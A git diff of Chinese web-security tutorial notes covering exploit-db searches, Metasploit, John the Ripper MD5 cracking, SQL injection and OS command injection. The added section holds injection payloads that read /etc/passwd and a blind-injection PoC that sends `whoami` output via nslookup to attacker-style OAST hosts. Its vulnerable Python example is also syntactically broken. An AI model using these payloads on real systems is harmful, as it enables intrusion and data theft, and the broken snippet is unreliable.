@@ -5,7 +5,7 @@ categories:
   - 教程
 tags: [web, web Security]
 sidebar: false
-outline: deep
+outline: 2
 ---
 
 # Web Security
@@ -70,9 +70,7 @@ X-Forwarded-For: 127.0.0.1
 
 ---
 
-## exploit
-
-### Exploit-db
+## Exploit-db
 
 [exploit-db](https://www.exploit-db.com/), Kali linux 官方团队维护的一个安全项目，是公认的世界上最大的搜集漏洞的数据库。
 
@@ -91,9 +89,7 @@ searchsploit -m 34992.py
 # 更新本地漏洞库
 searchsploit -u
 ```
----
-
-### Metasploit
+## Metasploit
 
 [Metasploit Framework](../security/Metasploit.md) , 通常简称**MSF**。一个强大的漏洞利用和测试的综合平台，其中集成了大量的漏洞利用工具。在Kali中集成了MSF的社区版本。
 
@@ -142,7 +138,43 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 ---
 
-## database
+## brutepforce
+
+[bruteforce tools](../security/bruteforcingtools.md)
+
+**字典去重排序**
+
+```bash
+sort -u wordlist.dic > sortedwordlist.dic
+```
+
+## John 
+
+[John the Ripper](../crypto/john.md)
+
+**Cracking**
+
+```bash
+john --format=raw-md5 --wordlist=/wordlists/hash-dic.txt hash-target.txt
+```
+**查看结果**
+
+```bash
+john --show --format=raw-md5 hash-target.txt
+```
+
+**其它**
+
+`hash-identifier`
+
+`john --list=formats`
+
+---
+
+
+## sql inject
+
+### database
 
 [databases](../cyber/WebApplication.md#database)
 
@@ -181,43 +213,77 @@ show tables;
 DESC users;
 select name, pass from users;
 ```
-
-### sql inject
-
 [sql inject](../vuln/SqlInject.md)
 
 ---
 
-## brutepforce
+## File upload vulnerabilities
 
-[bruteforce tools](../security/bruteforcingtools.md)
+[File upload vulnerabilities](../vuln/FileVuln.md#file-upload)
 
-**字典去重排序**
-
-```bash
-sort -u wordlist.dic > sortedwordlist.dic
-```
-
-### John 
-
-[John the Ripper](../crypto/john.md)
-
-**Cracking**
-
-```bash
-john --format=raw-md5 --wordlist=/wordlists/hash-dic.txt hash-target.txt
-```
-**查看结果**
-
-```bash
-john --show --format=raw-md5 hash-target.txt
-```
-
-**其它**
-
-`hash-identifier`
-
-`john --list=formats`
+[portswigger-file-upload](https://portswigger.net/web-security/file-upload)
 
 ---
 
+## Path traversal
+
+[Path traversal](../vuln/FileVuln.md#path-traversal)
+
+[portswigger-file-path-traversal](https://portswigger.net/web-security/file-path-traversal)
+
+---
+
+## command injection
+
+[portswigger-os-command-injection](https://portswigger.net/web-security/os-command-injection)
+
+操作系统命令注入(**OS Command Injection**) 也称为 shell 注入(**shell injection**)，攻击者通过向应用程序传入恶意输入，使其在服务器操作系统上执行任意命令。当应用程序将用户输入**未经验证地**拼接到系统命令中时，就会发生这种攻击。
+
+**漏洞原理**
+
+应用程序通常会调用系统命令来完成某些功能（如文件操作、ping 检测等）。若直接拼接用户输入，攻击者就可以"注入"额外的命令。
+
+🔴 **漏洞代码示例（Python）**
+
+```python
+import os
+
+def ping_host(user_input
+    # 危险！直接拼接用户输入
+    os.system(f"ping -c 1 {user_input}")
+```
+**攻击演示**
+
+| 用户输入 | 实际执行的命令 | 效果 |
+|---|---|---|
+| `8.8.8.8` | `ping -c 1 8.8.8.8` | 正常 ping |
+| `8.8.8.8; cat /etc/passwd` | `ping -c 1 8.8.8.8; cat /etc/passwd` | 泄露系统用户文件 |
+| `8.8.8.8 \| whoami` | `ping -c 1 8.8.8.8 \| whoami` | 获取当前用户身份 |
+
+**常用的注入分隔符**
+
+| 符号 | 含义 | 系统 |
+|---|---|---|
+| `;` | 顺序执行 | Linux/macOS |
+| `&&` | 前一条成功后执行 | 通用 |
+| `\|\|` | 前一条失败后执行 | 通用 |
+| `\|` | 管道 | 通用 |
+| `` ` `` | 命令替换 | Linux/macOS |
+| `$(...)` | 命令替换 | Linux/macOS |
+| `&` | 后台执行 | Windows |
+| `\r\n` | 换行注入 | Windows |
+
+### blind OS command
+
+**PoC**
+
+*redirecting output*
+```bash
+& whoami > /var/www/static/whoami.txt &
+||whoami+>+/var/www/images/whoami2.txt||
+```
+*out-of-band (OAST) techniques*
+```bash
+& nslookup kgji2ohoyw.web-attacker.com &
+||nslookup+`whoami`.xxx.oastify.com||
+```
